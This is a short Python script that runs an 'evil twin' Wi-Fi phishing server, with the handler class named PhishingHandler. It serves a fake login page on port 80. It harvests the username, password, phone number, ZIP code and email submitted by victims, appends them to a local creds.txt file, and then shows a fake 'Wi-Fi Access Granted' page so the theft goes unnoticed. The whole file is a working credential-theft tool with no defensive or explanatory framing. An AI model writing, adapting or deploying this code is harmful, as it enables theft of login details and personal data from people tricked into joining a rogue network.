from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open("index.html", "r") as file:
            self.wfile.write(file.read().encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        parsed_data = urlparse.parse_qs(post_data.decode('utf-8'))

        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]
        phone = parsed_data.get('phone', [''])[0]
        zipcode = parsed_data.get('zipcode', [''])[0]
        email = parsed_data.get('email', [''])[0]

        # Log the captured credentials to a file
        with open("creds.txt", "a") as creds:
            creds.write(f"Username: {username}, Password: {password}, Phone: {phone}, ZIP: {zipcode}, Email: {email}\n")

        # Send a success message back to the client
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
        <html>
        <head>
            <title>Wi-Fi Access Granted</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #4CAF50;
                    color: white;
                    text-align: center;
                    padding: 50px;
                    animation: fadeIn 1.5s ease-in-out;
                }
                h1 {
                    font-size: 36px;
                    margin-bottom: 20px;
                }
                p {
                    font-size: 18px;
                    margin-bottom: 20px;
                }
                .success {
                    font-size: 22px;
                    padding: 15px;
                    border-radius: 8px;
                    background-color: #ffffff22;
                    display: inline-block;
                    margin-top: 30px;
                    animation: fadeIn 2s ease-in-out;
                }
                @keyframes fadeIn {
                    from { opacity: 0; transform: scale(0.9); }
                    to { opacity: 1; transform: scale(1); }
                }
            </style>
        </head>
        <body>
            <h1>Access Granted!</h1>
            <p>You are now connected to the Wi-Fi network.</p>
            <div class="success">Enjoy secure and fast internet access. Thank you!</div>
        </body>
        </html>
        """)

# Start the server
server_address = ('', 80)
httpd = HTTPServer(server_address, PhishingHandler)
print("EVil-Twin is running...")
httpd.serve_forever()
